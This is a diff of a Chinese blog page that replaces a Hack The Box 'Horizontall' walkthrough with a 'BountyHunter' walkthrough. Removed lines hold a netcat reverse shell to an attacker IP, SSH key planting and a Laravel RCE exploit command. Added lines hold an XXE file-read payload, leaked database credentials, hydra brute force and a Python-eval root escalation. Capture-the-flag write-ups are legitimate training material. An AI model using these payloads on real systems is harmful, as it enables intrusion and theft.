@@ -18,7 +18,7 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-  <title>Horizontall - Crush&#39;s Blog</title>
+  <title>BountyHunter - Crush&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -175,7 +175,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="Horizontall">
+            <span class="h2" id="subtitle" title="BountyHunter">
               
             </span>
 
@@ -185,7 +185,7 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-10-18 15:37" pubdate>
+      <time datetime="2021-10-18 14:00" pubdate>
         2021年10月18日 下午
       </time>
     </span>
@@ -197,7 +197,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      594 字
+      522 字
     </span>
   
 
@@ -207,7 +207,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      8
+      7
        分钟
     </span>
   
@@ -237,79 +237,108 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Horizontall</h1>
+            <h1 style="display: none">BountyHunter</h1>
             
             <div class="markdown-body">
               <hr>
-<pre><code>nmap -sS -sC -sV -A -p- 10.10.11.105
+<pre><code>wp参考： https://blog.csdn.net/weixin_47156475/article/details/119672224
+给的目标靶机10.10.11.100
 </code></pre>
-<p>一样的22 和 80 靶场绑定了域名修改etc/hosts文件 </p>
-<hr>
-<pre><code>echo 10.10.11.105 horizontall.htb &gt;&gt; /etc/hosts
+<h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/dhRf8uF6OwqCzET.png" srcset="/img/loading.gif" lazyload alt="image.png"></h2><pre><code>nmap -sV -T4 -A 10.10.11.100  扫描结果
 </code></pre>
-<p>gobuster啥都没跑出来 这种情况，网站没有啥功能点，但是扫目录也没有可以利用的东西，尝试从接口入手</p>
-<hr>
-<pre><code>jsfinder python3 JSFinder.py -u http://horizontall.htb/
-</code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d26652ab3f51d91b02160.jpg" srcset="/img/loading.gif" lazyload><br>同样的接口也写在hosts文件里</p>
-<hr>
-<pre><code>echo 10.10.11.105 api-prod.horizontall.htb &gt;&gt; /etc/hosts
-</code></pre>
-<p>扫接口看有没有东西<br><img src="https://pic.imgdb.cn/item/616d26692ab3f51d91b024b8.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>扫到一个后台，并且是一个cms，然后找下有没有公开的漏洞 </p>
-<hr>
-<pre><code>http://api-prod.horizontall.htb/admin/auth/login
-</code></pre>
-<p>访问目录/admin/strapiVersion可获取strapi的版本号<br><img src="https://pic.imgdb.cn/item/616d266e2ab3f51d91b02b91.jpg" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d26722ab3f51d91b02f1f.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>exp-db找到一个exp<br><img src="https://pic.imgdb.cn/item/616d26752ab3f51d91b03217.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>可以重置密码和rce</p>
-<hr>
-<pre><code>nc 10.10.14.7 1234  nc -lvvp 1234  弹是弹了，但是执行不了命令
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/GKiBoweQNUbxIc9.png" srcset="/img/loading.gif" lazyload alt="image.png"></h2><pre><code>进网页看看，不是什么cms，
 </code></pre>
 <hr>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 1234 &gt;/tmp/f
+<pre><code>gobuster 扫描一下目录
 </code></pre>
-<p><img src="https://pic.imgdb.cn/item/616d26782ab3f51d91b034c0.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>nc -lvvp 1234 弹回来了，能执行了 </p>
-<hr>
-<pre><code>python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; 
+<h2 id="-2"><a href="#-2" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/6hcwvZiktBGUnJ9.png" srcset="/img/loading.gif" lazyload></h2><pre><code>nikto -h 10.10.11.100  发现3个php的文件
+db.php这个在后面有大用
 </code></pre>
-<p>在home文件夹下的下一个文件夹找到user.txt<br><img src="https://pic.imgdb.cn/item/616d267c2ab3f51d91b03868.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>上传了一个提权工具linpeas.sh 这个脚本非常厉害，可以枚举linux操作系统几乎所有的可提权项，甚至可以通过su暴力破解本地密码，输出非常多。  第一次用这个工具，好像确实屌，找到一个8000的端口和一个1337端口<br><img src="https://pic.imgdb.cn/item/616d26802ab3f51d91b03c71.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>这个尝试连ssh 但是连不上<br><img src="https://pic.imgdb.cn/item/616d26832ab3f51d91b03e5d.jpg" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://i.loli.net/2021/10/18/ntYaGBHOep9ug7Q.png" srcset="/img/loading.gif" lazyload><br><img src="https://i.loli.net/2021/10/18/aJucf7CqNeyBrQj.png" srcset="/img/loading.gif" lazyload></p>
 <hr>
-<pre><code>de1veloper #J!:F9Zt2u
+<pre><code>readme.txt 也没有什么可用信息
 </code></pre>
-<p>传个frp访问一下他的8000端口 传了依旧访问不了，明天打，</p>
-<p>ssh-keygen生成一个公钥，传上去，然后连接</p>
-<hr>
-<pre><code>wget 10.10.14.7/id_rsa.pub -O authorized_keys
+<h2 id="-3"><a href="#-3" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/ixFJ6eSXKWEV9bI.png" srcset="/img/loading.gif" lazyload></h2><pre><code>然后开始在网站到处点，看看有没有什么后台，找找上传
 
-ssh strapi@10.10.11.105 -i id_rsa
+瞎几把点，点到一个这个玩意儿
 </code></pre>
-<p>ssh 把8000端口转发出来</p>
-<hr>
-<pre><code>ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105
+<h2 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/HcoRwZ2F6tmvgaO.png" srcset="/img/loading.gif" lazyload></h2><pre><code>好像是提交参数的东西，抓包看下，
+应该是base64 解密看下
 </code></pre>
-<p>数据库连接进去看一下 有一个strapi表<br><img src="https://pic.imgdb.cn/item/616d26862ab3f51d91b041b4.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>进去看下<br><img src="https://pic.imgdb.cn/item/616d26892ab3f51d91b0456d.jpg" srcset="/img/loading.gif" lazyload></p>
-<hr>
-<pre><code>select * from strapi_administrator; |  3 | admin    | admin@horizontall.htb | $2a$10$7NGi1GoBaGP3Lw3FYAjw9OhXkgqVRpoecHoaXXIwoVhLZx0etorve | NULL               |    NULL |
+<h2 id="-5"><a href="#-5" class="headerlink" title=""></a><img src="https://i.loli.net/2021/10/18/3z1j8sJvInYaSrq.png" srcset="/img/loading.gif" lazyload alt="image.png"></h2><pre><code>应该是base64 解密看下
 </code></pre>
-<p>kali 写个公钥进去 把端口带到本地的8000</p>
+<p><img src="https://i.loli.net/2021/10/18/1CzSY7X8yVZDIMr.png" srcset="/img/loading.gif" lazyload><br><img src="https://pic.imgdb.cn/item/616d11802ab3f51d919b0fb6.jpg" srcset="/img/loading.gif" lazyload></p>
 <hr>
-<pre><code>ssh -L 8000:127.0.0.1:8000 strapi@horizontall.htb
-</code></pre>
-<p>127.0.0.1:8000访问不了，不打了，下一位。</p>
-<p>他妈的，访问不了的原因是开了梯子，，，，淦<br><img src="https://pic.imgdb.cn/item/616d268d2ab3f51d91b04999.jpg" srcset="/img/loading.gif" lazyload></p>
-<p>红日7也出现过这玩意儿，直接用exp rce打就行了</p>
-<hr>
-<pre><code>python3 exploit.py http://localhost:8000 Monolog/RCE1 &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.7 2345 &gt;/tmp/f &quot;
+<pre><code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+    &lt;bugreport&gt;
+    &lt;title&gt;a&lt;/title&gt;
+    &lt;cwe&gt;b&lt;/cwe&gt;
+    &lt;cvss&gt;c&lt;/cvss&gt;
+    &lt;reward&gt;d&lt;/reward&gt;
+    &lt;/bugreport&gt;
 </code></pre>
 <hr>
-<pre><code>nc -lvvp 2345
+<pre><code>xml有点熟悉啊，思路好像清晰了，这个靶机应该考的xxe参考wp访问一下/etc/passwd
 </code></pre>
-<p>弹回来了<br><img src="https://pic.imgdb.cn/item/616d26902ab3f51d91b04d1a.jpg" srcset="/img/loading.gif" lazyload></p>
+<h2 id="-6"><a href="#-6" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12bc2ab3f51d919c21ff.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
+&lt;!DOCTYPE data [ &lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;
+    &lt;bugreport&gt;
+    &lt;title&gt;test&lt;/title&gt;
+    &lt;cwe&gt;test&lt;/cwe&gt;
+    &lt;cvss&gt;test&lt;/cvss&gt;
+    &lt;reward&gt;&amp;file;&lt;/reward&gt;
+    &lt;/bugreport&gt;
+</code></pre>
+<hr>
+<pre><code>PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KPCFET0NUWVBFIGRhdGEgWyA8IUVOVElUWSBmaWxlIFNZU1RFTSAiZmlsZTovLy9ldGMvcGFzc3dkIj5dPgoJCTxidWdyZXBvcnQ
+</code></pre>
+<hr>
+<pre><code>解密结果
+</code></pre>
+<hr>
+<pre><code>&lt;?php
+// TODO -&gt; Implement login system with the database.
+$dbserver = &quot;localhost&quot;;
+$dbname = &quot;bounty&quot;;
+$dbusername = &quot;admin&quot;;
+$dbpassword = &quot;m19RoAU0hP41A1sTsq6K&quot;;
+$testuser = &quot;test&quot;;
+?&gt;
+</code></pre>
+<hr>
+<pre><code>用这个账号密码尝试ssh登录
+ssh admin@10.10.11.100
+登录不上。。
+
+用刚刚的保存的文件生成一个密码字典
+cut -d : -f 1 passwd &gt;user
+</code></pre>
+<hr>
+<pre><code>用九头蛇看能不能爆破进去
+hydra -L user -p m19RoAU0hP41A1sTsq6K 10.10.11.100 ssh
+</code></pre>
+<h2 id="-7"><a href="#-7" class="headerlink" title=""></a><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/616d12c72ab3f51d919c2be7"></a></h2><pre><code>爆破出来了
+ssh development@10.10.11.100  m19RoAU0hP41A1sTsq6K
+ssh连上了，普通权限
+看wp的尝试提权
+</code></pre>
+<h2 id="-8"><a href="#-8" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12cc2ab3f51d919c3080.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>ec598c30b683202dbda87c5b7b3e108c
+</code></pre>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><hr>
+<pre><code>sudo -l
+看看是否有什么可以提取权限的方法，并且查看一下可以提权的文件
+</code></pre>
+<h2 id="-9"><a href="#-9" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12d12ab3f51d919c34c0.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>一个py文件，应该就是用它来提权了，python还是有点拉，大概能看懂，写不出来
+写一个.md文件，修改一个反弹shell
+</code></pre>
+<h2 id="-10"><a href="#-10" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12d42ab3f51d919c37c6.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code># Skytrain Inc   
+## Ticket to root  
+__Ticket Code:__  
+**102+ 10 == 112 and __import__(&#39;os&#39;).system(&#39;/bin/bash&#39;) == False 
+</code></pre>
+<h2 id="-11"><a href="#-11" class="headerlink" title=""></a><img src="https://pic.imgdb.cn/item/616d12db2ab3f51d919c3e73.jpg" srcset="/img/loading.gif" lazyload></h2><pre><code>1622fdb053418ba4935b17acccc77a12
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/616d12e22ab3f51d919c4602.jpg" srcset="/img/loading.gif" lazyload></p>
 
             </div>
             <hr>
@@ -344,9 +373,9 @@ ssh strapi@10.10.11.105 -i id_rsa
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/10/18/Driver/">
+                      <a href="/2021/10/18/Hach%20The%20Box-Previse/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Driver</span>
+                        <span class="hidden-mobile">Previse</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -354,8 +383,8 @@ ssh strapi@10.10.11.105 -i id_rsa
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/10/18/Previse/">
-                        <span class="hidden-mobile">Previse</span>
+                      <a href="/2021/09/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%96%B0%E6%89%8B%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="hidden-mobile">记一次新手的内网渗透</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
